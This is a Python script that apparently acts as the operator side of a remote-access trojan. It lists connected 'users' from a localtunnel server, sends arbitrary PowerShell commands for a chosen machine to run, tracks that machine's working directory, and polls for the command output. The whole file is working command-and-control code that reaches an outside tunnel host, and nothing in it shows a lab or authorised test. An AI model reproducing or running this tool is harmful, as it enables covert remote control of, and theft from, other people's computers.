import requests
import os, platform
import time
cwd = os.getcwd()
path = 'c:/'
oldPath = 'c:/'
osName = platform.system()

if osName == 'Windows':
    clear = lambda: os.system('cls')
else:
    clear = lambda: os.system('clear')

defaultAssemblys = []
with open('DefaultAssembly.txt', 'r')  as assemblys:
    defaultAssemblys = assemblys.readlines()

url = 'https://olive-walls-cough-100-999-111-93.loca.lt/'

headres = {"Content-Type": "application/json",}

curUser = ''

def send(path:str,data):
    while True:
        r = requests.post(url+path,headers = headres,json=data)
        if r.text.split()[0] != '<html>':
            break
    return r.text
def get(path:str):
    while True:
        r = requests.get(url+path)
        r.encoding = 'utf-8'
        if len(r.text)<= 1 or r.text.split()[0] != '<html>':
            break
    return r

#curUser = input('Select user: ')

def sellector():
    clear()
    print('1: Select user')
    select = input('Select: ')
    return select

def userSellector():
    clear()
    global curUser
    try:
        users = get('users').json()
    except:
        print('nope')
        mainMenu()
    print('Available users:')
    count = 0
    for i in range(len(users)):
        print(str(i)+':',users[i])
        count =+ 1
    selectedUser = input('Select user: ')
    if selectedUser == 'exit':
        return
    try:
        curUser = users[int(selectedUser)]
    except:
        print('Not founded user!')
        input('')
        userSellector()
    clear()
    print('Selected user: '+curUser)
def mainMenu():
    while True:
        select = sellector()
        if select == '1':
            userSellector()
            break
mainMenu()
while True:
    try:
        re = '404'
        message = input(path+'> ')
        if message.replace(' ','') == '':
            print('Empty message!')
            continue
        if message == '//EXIT':
            mainMenu()
            message = ''
            continue
        if message == 'cls':
            clear()
            continue
        if message == 'next':
            re = get('response/'+curUser).text
            print('Answer: '+re)
            continue
        if message == 'nextf':
            while re != '404':
                re = get('response/'+curUser).text
                print('Answer: '+re)
            continue
        r = send('/send/req',data={'user': curUser,'message': 'Add-Type -AssemblyName '+','.join(defaultAssemblys).replace('\n','')+' ; cd "'+path+'" ; '+f" {message}"})
        if r == '404':
            userSellector()
        if len(r) > 3:
            r = '404'
        print('status: ' + r)
        time.sleep(0.5)
        while re == '404':
            re = get('response/'+curUser).text
            time.sleep(0.5)
        if message.split()[0] == 'cd':
            targetPath = ''.join(message.split('"')[1:2])
            if len(targetPath) <= 0:
                path = 'C:/'
            elif message.split()[1] == 'back':
                path = oldPath
            else:
                if targetPath[:2] == 'C:':
                    oldPath = path
                    path = targetPath
                else:
                    oldPath = path
                    path = path+'/'+targetPath
    except:
        continue
                
    print('Answer: '+re)
